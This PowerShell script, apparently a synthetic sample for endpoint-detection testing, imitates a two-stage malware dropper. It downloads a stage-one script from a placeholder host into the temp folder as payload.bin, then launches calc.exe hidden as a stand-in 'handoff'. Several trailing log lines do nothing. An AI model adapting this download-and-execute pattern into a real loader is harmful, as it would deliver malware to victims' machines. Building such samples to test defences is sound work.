
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://contoso.com:80/stage1.ps1',
    [string]$DownloadPath = "$env:TEMP\payload.bin",
    [string]$LogPath = "$env:TEMP\report.txt",
    [int]$TransferTimeout = 57
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 57
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $TransferResult = Invoke-Stage1Download -SourceUrl $TargetUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout
    if ($TransferResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $DownloadPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $TargetUrl
    Destination = $DownloadPath
    TimeoutSec = $TransferTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Inspecting process list"
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Preparing working directory"
Write-Verbose "Checking local path"
Write-Verbose "Collecting host metadata"
Start-Sleep -Seconds 17
$StageMarker = "stage-13"
